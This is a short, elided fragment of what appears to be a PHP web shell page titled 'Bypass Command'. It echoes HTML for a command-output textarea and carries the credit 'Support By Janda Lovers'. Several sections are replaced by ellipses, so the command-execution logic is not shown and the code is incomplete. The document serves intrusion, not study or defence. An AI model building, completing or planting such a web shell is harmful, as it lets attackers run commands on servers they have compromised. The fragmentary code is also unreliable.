...
echo "<html>
<head><title>~Bypass Command~</title><link href='https://i.ibb.co.com/c370tBg/SEO-ABAL-ABAL.jpg (497×506)' rel='icon' type='image/x-icon'/>
...
<body>
<br><div class='jurus'>Bypass Command</div></br>
...
echo "</textarea>
    ...
    <br><div class='jurus1'>Support By Janda Lovers</div></br>
</form>
</body>
</html>";
